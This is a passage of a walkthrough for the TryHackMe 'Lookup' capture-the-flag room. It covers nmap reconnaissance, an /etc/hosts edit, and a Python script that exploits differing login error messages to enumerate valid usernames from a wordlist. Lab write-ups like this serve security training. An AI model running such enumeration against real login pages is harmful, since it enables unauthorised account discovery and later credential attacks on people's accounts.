![intro](https://github.com/user-attachments/assets/d3499a97-8b5a-4005-8d02-76492450fbc6)
![intro2](https://github.com/user-attachments/assets/5526b3d0-e823-40b4-b8f0-eb83ba319a99)

# tryhackme-Lookup

This is a walkthrough for the tryhackme CTF Lookup. I will not provide any flags or passwords as this is intended to be used as a guide. 

## Scanning/Reconnaissance

First off, let's store the target IP as a variable for easy access.

Command: export ip=xx.xx.xx.xx

Next, let's run an nmap scan on the target IP:
```bash
nmap -sV -sC -A -v $ip -oN nmap.txt
```

Command break down:

-sV

Service Version Detection: This option enables version detection, which attempts to determine the version of the software running on open ports. For example, it might identify an HTTP server as Apache with a specific version.
-sC

Default Scripts: This option runs a collection of default NSE (Nmap Scripting Engine) scripts that are commonly useful. These scripts perform various functions like checking for vulnerabilities, gathering additional information, and identifying open services. They’re a good starting point for gathering basic information about a host.
-A

Aggressive Scan: This option enables several scans at once. It combines OS detection (-O), version detection (-sV), script scanning (-sC), and traceroute (--traceroute). It’s useful for a comprehensive scan but can be intrusive and time-consuming.
-v

Verbose Mode: Enables verbose output, which provides more detailed information about the scan’s progress and results.
$ip

Target IP: This is a placeholder for the target IP address you want to scan. In practice, replace $ip with the actual IP of the machine you are targeting.
-oN

Output in Normal Format: This option saves the scan results in a plain text file format. After -oN, specify a filename where you want to store the scan.

![nmap](https://github.com/user-attachments/assets/aa56659a-06a8-4529-92e0-43f9d8b2263b)

This scan reveals two open ports: 22, and 80. Let's check out the Apache webserver on port 80.

![trouble](https://github.com/user-attachments/assets/a27b70c4-574b-4235-ac56-7e669e835b9f)

The url populates as lookup.thm but the site can't be reached. Let's append the ip and lookup.thm to our /etc/hosts file.

![etc_hosts](https://github.com/user-attachments/assets/4461e87f-c2c9-42a1-8f4a-0dc73e7d113f)

Now, when we refresh the page, we are presented with a login page:

![login](https://github.com/user-attachments/assets/041b52b3-515b-4b6f-90e8-869505aad06c)

At first, I tried to log in with some common default credentials, admin:admin. There was a message that appears saying wrong password. 

![wrongpw](https://github.com/user-attachments/assets/ec109c9e-ed8e-4309-b667-272dcc0f166b)

This made me think that the login page will display errors specific to the username being correct or not. To test this theory I attempted to log in with bob:admin, and this time the error states, Wrong username or password.

![wrongun](https://github.com/user-attachments/assets/f8350a30-71a1-4314-a471-064b22f3e7aa)

To find out the correct user names for login I used this python script against the login:
``` bash
import requests

# Target URL
url = "http://lookup.thm/login.php"

# Define path to usernames
file_path = "/usr/share/seclists/Usernames/Names/names.txt"

try:
    with open(file_path, "r") as file:
        for line in file:
            username = line.strip()
            if not username:
                continue  # Skip empty lines

            # Prepare the POST data
            data = {
                "username": username,
                "password": "password"  # Fixed password for testing (note the correction here)
            }

            # Send the POST request
            response = requests.post(url, data=data)

            # Check the response content
            if "Wrong password" in response.text:
                print(f"Username found: {username}")
            elif "wrong username" in response.text:
                continue  # Silent continuation for wrong username

except FileNotFoundError:
    print(f"Error: The file {file_path} does not exist.")
except requests.RequestException as e:
    print(f"Error: An HTTP request error occurred: {e}")
```
